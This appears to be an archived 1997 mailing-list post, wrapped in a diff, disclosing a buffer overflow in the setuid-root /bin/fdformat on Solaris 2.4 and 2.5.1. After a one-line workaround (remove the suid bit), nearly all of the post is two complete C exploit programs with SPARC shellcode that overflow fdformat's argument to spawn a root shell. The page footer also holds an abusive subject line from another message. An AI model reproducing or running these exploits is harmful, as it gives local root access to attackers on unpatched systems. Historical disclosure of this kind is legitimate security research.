@@ -1,0 +1,233 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: Remake: buffer overflow in /bin/fdformat + exploit (Solaris2.X) -->
+<!--X-From-R13: Qevfgvna Epuvcbe <fxvcbN[ngu.BGP.Db> -->
+<!--X-Date: Sun, 23 Mar 1997 07:58:08 &#45;0800 (PST) -->
+<!--X-Message-Id: Pine.SUN.3.95.970323175715.2710G&#45;100000@euler.math.pub.ro -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>Remake: buffer overflow in /bin/fdformat + exploit (Solaris2.X)</TITLE>
+<LINK REV="made" HREF="mailto:skipo@Math.PUB.Ro">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg00599.html">Date Prev</A>][<A HREF="msg00612.html">Date Next</A>][<A HREF="msg00599.html">Thread Prev</A>][<A HREF="msg00612.html">Thread Next</A>][<A HREF="index.html#00622">Date Index</A>][<A HREF="threads.html#00622">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>Remake: buffer overflow in /bin/fdformat + exploit (Solaris2.X)</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:cypherpunks@toad.com">cypherpunks@toad.com</A></LI>
+<LI><em>Subject</em>: Remake: buffer overflow in /bin/fdformat + exploit (Solaris2.X)</LI>
+<LI><em>From</em>: Cristian Schipor &lt;<A HREF="mailto:skipo@Math.PUB.Ro">skipo@Math.PUB.Ro</A>&gt;</LI>
+<LI><em>Date</em>: Sun, 23 Mar 1997 17:57:58 +0200 (EET)</LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@toad.com">owner-cypherpunks@toad.com</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+
+motto: " No one would have believed in the last years of the nineteenth
+century that this world was being watched keenly and closely by
+intelligences greater than man's and yet as mortal as his own; that as men
+busied themselves about their various concerns they were scrutinised and
+studied, perhaps almost as narrowly as a man with a microscope might scru-
+tinise the transient creatures that swarm and multiply in a drop of
+water."
+			H.G.Wells - "The War of the Worlds"
+
+
+Sun Mar 23 16:56:15 EET 1997 Romania
+
+"Remake for bufer-overflow in find_media() now in /bin/fdformat"
+
+The buffer overflow bug I posted to you in Mar 13 1997 is present in
+/bin/fdformat too (which has in may solaris 2.4 and 2.5.1 distributions
+the suid-exec bit on and it is owned by root). By exploiting fdformat with
+suid-exec bit on, anyone can gain a root (or who is the owner of fdformat)
+shell. So, to prevent an fdformat exploit, remove the suid-exec bit from
+/bin/fdformat. 
+
+Cristian Schipor - Computer Science Faculty - Bucharest - Romania
+Email: skipo@math.pub.ro, skipo@sundy.cs.pub.ro, skipo@ns.ima.ro
+Phone: 401-410.60.88
+
+See <A  HREF="http://www.math.pub.ro/security">http://www.math.pub.ro/security</A>
+
+My exploits (with argv[1] you can change the STACK_OFFSET, +- x, x=8*k
+k=1,2,3,...): 
+
+--------------------------- lion24.c ---------------------------------
+/*
+Solaris 2.4
+*/
+
+   #include &lt;stdio.h&gt;
+   #include &lt;stdlib.h&gt;
+   #include &lt;sys/types.h&gt;
+   #include &lt;unistd.h&gt;
+   
+   #define BUF_LENGTH 264
+   #define EXTRA 36
+   #define STACK_OFFSET -56
+   #define SPARC_NOP 0xa61cc013
+   
+   u_char sparc_shellcode[] =
+
+   "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
+   "\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
+   "\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+   "\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
+   "\x91\xd0\x20\x08"
+   ;
+   
+   u_long get_sp(void)
+   {
+   __asm__("mov %sp,%i0 \n");
+   }
+   
+   void main(int argc, char *argv[])
+   {
+   char buf[BUF_LENGTH + EXTRA + 8];
+   long targ_addr;
+   u_long *long_p;
+   u_char *char_p;
+   int i, code_length = strlen(sparc_shellcode),dso=0;
+   
+   if(argc &gt; 1) dso=atoi(argv[1]);
+   
+   long_p =(u_long *) buf ;
+   targ_addr = get_sp() - STACK_OFFSET - dso;
+   
+   for (i = 0; i &lt; (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+   *long_p++ = SPARC_NOP;
+   
+   char_p = (u_char *) long_p;
+   
+   for (i = 0; i &lt; code_length; i++)
+   *char_p++ = sparc_shellcode[i];
+   
+   long_p = (u_long *) char_p;
+   
+   for (i = 0; i &lt; EXTRA / sizeof(u_long); i++)
+   *long_p++ =targ_addr;
+   
+   printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
+   targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
+   execl("/bin/fdformat", "fdformat   ", &amp;buf[0],(char *) 0);
+   perror("execl failed");
+   }
+------------------------------ end of lion24.c --------------------------
+
+-------------------------------- lion25.c ------------------------------
+/* 
+Solaris 2.5.1 - this exploited was compiled on Solaris2.4 and tested on
+2.5.1
+*/
+
+   #include &lt;stdio.h&gt;
+   #include &lt;stdlib.h&gt;
+   #include &lt;sys/types.h&gt;
+   #include &lt;unistd.h&gt;
+   
+   #define BUF_LENGTH 364
+   #define EXTRA 400
+   #define STACK_OFFSET 704
+   #define SPARC_NOP 0xa61cc013
+   
+   u_char sparc_shellcode[] =
+
+   "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
+   "\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
+   "\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+   "\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
+   "\x91\xd0\x20\x08"
+   ;
+   
+   u_long get_sp(void)
+   {
+   __asm__("mov %sp,%i0 \n");
+   }
+   
+   void main(int argc, char *argv[])
+   {
+   char buf[BUF_LENGTH + EXTRA + 8];
+   long targ_addr;
+   u_long *long_p;
+   u_char *char_p;
+   int i, code_length = strlen(sparc_shellcode),dso=0;
+   
+   if(argc &gt; 1) dso=atoi(argv[1]);
+   
+   long_p =(u_long *) buf ;
+   targ_addr = get_sp() - STACK_OFFSET - dso;
+   for (i = 0; i &lt; (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+   *long_p++ = SPARC_NOP;
+   
+   char_p = (u_char *) long_p;
+   
+   for (i = 0; i &lt; code_length; i++)
+   *char_p++ = sparc_shellcode[i];
+   
+   long_p = (u_long *) char_p;
+   
+   for (i = 0; i &lt; EXTRA / sizeof(u_long); i++)
+   *long_p++ =targ_addr;
+   
+   printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
+   targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
+   execl("/bin/fdformat", "fdformat", &amp; buf[1],(char *) 0);
+   perror("execl failed");
+   }
+
+--------------------------- end of lion25.c -------------------------------
+
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg00599.html">Cocksucker John Gilmore and his mouthpiece Rich Graves exposed as liars</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg00612.html">Interesting Job Offer</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg00599.html">Cocksucker John Gilmore and his mouthpiece Rich Graves exposed as liars</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg00612.html">Interesting Job Offer</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#00622"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#00622"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
